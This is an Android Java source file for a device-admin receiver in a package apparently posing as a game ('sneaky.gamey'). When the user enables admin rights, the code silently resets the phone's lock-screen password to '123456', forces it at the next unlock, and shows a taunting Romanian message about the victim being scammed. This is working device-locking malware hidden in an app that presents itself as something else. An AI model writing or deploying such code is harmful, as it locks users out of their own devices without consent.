package com.sneaky.gamey.receivers;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    public void onEnabled(Context context, Intent intent) {
        setPassword(context);
    }

    private void setPassword(Context context) {
        DevicePolicyManager devicePolicyManager =(DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(context, AdminReceiver.class);
        try {
            devicePolicyManager.setPasswordQuality(cn, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
            devicePolicyManager.setPasswordMinimumLength(cn, 5);
            devicePolicyManager.resetPassword("123456", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            Toast.makeText(context, "tzeapa, ce, n-ai mai luat tzeapa? xD", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onDisabled(Context context, Intent intent) {
    }
}
